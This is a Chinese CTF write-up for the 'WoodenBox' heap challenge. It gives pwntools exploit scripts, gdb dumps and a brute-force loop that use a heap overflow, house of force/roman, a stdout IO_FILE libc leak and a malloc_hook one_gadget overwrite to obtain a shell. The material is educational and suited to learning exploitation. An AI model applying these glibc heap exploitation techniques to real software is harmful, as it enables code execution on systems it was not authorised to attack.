# WoodenBox

首先patch一下，用自己的glibc2-23的so和ld文件。

![LhZgP6](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/LhZgP6.png)

漏洞很简单,修改数据时可以写入无限长度的数据，造成堆溢出。

```python
#!/usr/bin/python
from pwn import *

p=process("./woodenbox2")
#context.log_level='Debug'
gdb.attach(p)


def malloc(size,data):
	p.recvuntil("Your choice:")
	p.sendline(str(1))
	p.recvuntil("Please enter the length of item name:")
	p.sendline(str(size))
	p.recvuntil("Please enter the name of item:")
	p.sendline(data)
def free(index):
	p.recvuntil("Your choice:")
	p.sendline(str(3))
	p.recvuntil("Please enter the index of item:")
	p.sendline(str(index))
def edit(index,size,data):
	p.recvuntil("Your choice:")
	p.sendline(str(2))
	p.recvuntil("Please enter the index of item:")
	p.sendline(str(index))
	p.recvuntil("Please enter the length of item name:")
	p.sendline(str(size))
	p.recvuntil("Please enter the new name of the item")
	p.sendline(data)
	
malloc(0x38,"A"*0x30)
malloc(0x100,"B"*0x30)
#malloc(0x20,"C"*0x10)iq
edit(0,0x50,"C"*0x45)
#free(1)

p.interactive()
```

但是程序没有输出函数，所以通过泄漏地址。fastbin attack显然是不行的。并且程序开启了PIE，覆盖got表也不可行。并且程序一次free会把之后的index都往前移动一位，并且会将index小于这个的指针从list中清除，这点是需要注意的（别问我怎么发现的）。

```
gdb-peda$ checksec 
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial
```

看一看top chunk attack，几个要点这道题貌似都包含。

1. 存在漏洞能控制top_chunk的size大小
2. 能自由控制分配堆的大小
3. 分配的次数不受限制

***Demo***

HOUSE OF FORCE劫持TOP CHUNK读写任意地址

```python
malloc(0x20,"A"*0x20)

edit(0,0x50,"D"*0x20+p64(0)+p64(0xffffffffffffffff))
#check x/100xg 0x2020a0+0x0000555555554000,store the chunk list
malloc(-4256,"A"*0x100) #0x10a0
malloc(0x20,"B"*0x18)
#now check x/100xg 0x2020a0+0x0000555555554000
```

因为heap和got表是在同一块内存页里，发现可以无视PIE。。。感觉可以直接覆写got表。不过因为PIE开着，没啥东西可以覆盖给got表。。。（plt地址也会变，低地址覆盖也因为\x00而不存在）

考虑一下IO_FILE泄漏地址吧

![m45N6h](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/m45N6h.png)

或者尝试申请一个0x200000大小的超大堆，glibc会使用mmap来分配内存，该内存于libc在同一个内存页。

![EWcD7A](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/EWcD7A.png)



发现我审题真的很烂，题目明摆着就是告诉我们***house of roman***，也就是别想泄漏地址了，直接用低地址覆盖。

***实现got表的低地址覆盖(只要malloc的size和输入的data数量相同，结尾就不会有\x00)***

```python
malloc(0x20,"A"*0x20)

edit(0,0x50,"D"*0x20+p64(0)+p64(0xffffffffffffffff))
#check x/100xg 0x2020a0+0x0000555555554000,store the chunk list
malloc(-4408,"A"*0x10) #0x10a0
malloc(0x9,"B"*0x9) #free_got low byte
```

覆盖free got低地址，修改free got为system地址.不过开了ASLR（&PIE）之后就段错误了。应该是因为页之间的偏移也变了。

```python
malloc(0x20,"T"*0x10)
free(0)
malloc(0x20,"A"*0x20)

edit(0,0x50,"D"*0x20+p64(0)+p64(0xffffffffffffffff))
#check x/100xg 0x2020a0+0x0000555555554000,store the chunk list
raw_input()
malloc(-4408,"A"*0x10) #0x10a0
malloc(0xb,"B"*0x8+"\x90\x23\xa5") #free_got low byte

p.recvuntil("Your choice:")
p.sendline(str(4))
```

当然利用house of force最后是无法利用的，还是参考各种house of roman 。

需要结合fastbin attack和unsortbin attack，不过比赛我并没有成功实现（逃。



**最后看了WP**

发现自己思路其实没有偏离很多。还是house of roman可以结合堆溢出对fd和bk进行低地址写，覆盖IO FILE（stdout）进行地址泄漏。其实当时没有分析出来的是remove的机制。

在***remove_iterm***中，每次free都会将iterm中的所有数据向前0x10字节。例如free(10)之后，再次free(10)就会free到原本的chunk11。之前我分析错了，以为每次都会清除所有的iterms。

```c++
      for ( i = 0; i <= 10; ++i )
      {
        v0 = 16LL * i;
        v1 = (__int64 *)((char *)&itemlist + 16 * (i + 1));
        v2 = *v1;
        v3 = v1[1];
        *(_QWORD *)((char *)&itemlist + v0) = v2;
        *(_QWORD *)((char *)&itemlist + v0 + 8) = v3;
      }
```

DEMO

利用堆溢出来伪造chunk，实现堆重叠。然后通过切割法（我称之为。。只是一个trick，方便自己记忆），将main_arena+0x88地址被写到了free chunk_c的fd和bk。

```python
malloc(0x20,"A"*0x10) #0
malloc(0x40,"B"*0x10) #1
malloc(0x60,"C"*0x10) #2
malloc(0xa0,"D"*0x10) #3

edit(0,0x30,"E"*0x10+p64(0)*3+p64(0xc1)) #B_size <--B+C size=0x50+0x70
free(1) #free B(fake size)
free(1) #free C
malloc(0x40,"B"*0x10) #let main_arena+0x88 -->free chunk_c's fd
```

***IO_File泄露地址***

思路：修改stdout的***flag***位为0xfbad1800,然后将***_IO_write_base***最后一个字节改小。就能leak出libc地址。

```
gef➤  p _IO_2_1_stdout_
$2 = {
  file = {
    _flags = 0xfbad2887, 
    _IO_read_ptr = 0x7ffff7dd26a3 <_IO_2_1_stdout_+131> "\n", 
    _IO_read_end = 0x7ffff7dd26a3 <_IO_2_1_stdout_+131> "\n", 
    _IO_read_base = 0x7ffff7dd26a3 <_IO_2_1_stdout_+131> "\n", 
    _IO_write_base = 0x7ffff7dd26a3 <_IO_2_1_stdout_+131> "\n", 
    _IO_write_ptr = 0x7ffff7dd26a3 <_IO_2_1_stdout_+131> "\n", 
    _IO_write_end = 0x7ffff7dd26a3 <_IO_2_1_stdout_+131> "\n", 
    ...
    _codecvt = 0x0, 
    _wide_data = 0x7ffff7dd17a0 <_IO_wide_data_1>, 
    _freeres_list = 0x0, 
    _freeres_buf = 0x0, 
    __pad5 = 0x0, 
    _mode = 0xffffffff, 
    _unused2 = '\000' <repeats 19 times>
  }, 
  vtable = 0x7ffff7dd06e0 <_IO_file_jumps>
}
```

![woodenhouse2-1](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/woodenhouse2-1.png)

覆盖***main_arena+0x88***低位为0x25dd，O_2_1 stderr+0x157 的位置正好满足fastbin attack的条件。不过在ASLR开启之后，低三位偏移还是固定的，但是高的一位有1/16的几率正确。覆盖之后的效果。（write_base地址没改成功。。）

 ```
gef➤  p _IO_2_1_stdout_
$1 = {
  file = {
    _flags = 0xfbad1800, 		<--flag 修改为0xfbad1800
    _IO_read_ptr = 0"\n", 
    _IO_read_end = 0 "\n", 
    _IO_read_base = 0 <_IO_2_1_stdout_+131> "\n", 
    _IO_write_base = 0x7ffff7dd26a3 <_IO_2_1_stdout_+131> "\n", 
    _IO_write_ptr = 0x7ffff7dd26a3 <_IO_2_1_stdout_+131> "\n", 
    _IO_write_end = 0x7ffff7dd26a4 <_IO_2_1_stdout_+132> "",  <--低位写\x00
    _IO_buf_base = 0x7ffff7dd26a3 <_IO_2_1_stdout_+131> "\n", 
    _IO_buf_end = 0x7ffff7dd26a4 <_IO_2_1_stdout_+132> "", 
    _IO_save_base = 0x0, 

 ```

我们通过house of roman部分地址写，来爆破stdout的地址，然后通过IO_FILE来泄露地址。

```python
#house of roman
edit(0,(0x50+0x2),p64(0)*9+p64(0x71)+"\xdd\x25") #fastbin -> stdout
malloc(0x65,"malloc")
flag=0xfbad1800
malloc(0x65,"\x00"*3+p64(0)*0x6+p64(flag)+p64(0x4141414141414141)*3+"\x00")

#0x7ffff7a89b00-0x00007ffff7a0d000
recv=u64(p.recv(8))
libc=recv-(0x7ffff7a89b00-0x00007ffff7a0d000)
print "[*]recv="+hex(recv)
print "[*]libc="+hex(libc)
p.recvuntil("Your choice:")
```

继续fastbin attack，直接修改malloc_hook的值。不过所有的one_gadget都不可用，于是还是通过realloc来修改栈环境，然后one_gadget ，Getshell.

```python
malloc(0x20,"fastbin")
malloc(0x65,"attack")
free(5)
edit(0,0x3000,p64(0)*21+p64(0x71)+p64(malloc_hook-0x23))
malloc(0x65,"get")
malloc(0x65,"\x00"*3+p64(0)+p64(one_gadget)+p64(realloc))

p.recvuntil("Your choice:")
p.sendline(str(1))
p.recvuntil("Please enter the length of item name:")
p.sendline(str(0x20))
```

开启ASLR，然后使用shell脚本连续跑，就能跑出结果。

![A54lyO](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/A54lyO.png)

```shell
#!/bin/bash
for i in `seq 1 5000`; do python exp.py; done;
```

## 小结

***在没有输出函数时该如何泄漏地址***

- got表覆盖（PIE关闭/或者有其他条件）
- [IO_FILE泄漏地址](https://xz.aliyun.com/t/5057) (本题）
- 低地址写，爆破。

当然，通过unsortbin（main_arena+0x88）来获得libc地址也是必备知识，house of roman通过对其进行低地址覆盖，可以将爆破的成功率提高到1/16。



最后，大佬们太强了。

## 参考

http://p4nda.top/2018/08/27/WDBCTF-2018/

https://n0va-scy.github.io/2019/09/21/IO_FILE/

https://www.xd10086.com/posts/1782925604675044891/

[星盟的WP](https://url.cn/5C8CqwL)

[V&N的WP](https://mp.weixin.qq.com/s?srcid=&scene=23&sharer_sharetime=1583841726430&mid=2247484701&sharer_shareid=a22d80bdd0fe393dbf72182e9f57311b&sn=24cf333e50b5a1325a095298624c365d&idx=1&__biz=MzIxMDYyNTk3Nw%253D%253D&chksm=9760f1cba01778dd43654769b5158c632b62ff1291285ee7b2b41e0d39c08d47dfdffb4e3927&mpshare=1%23rd)

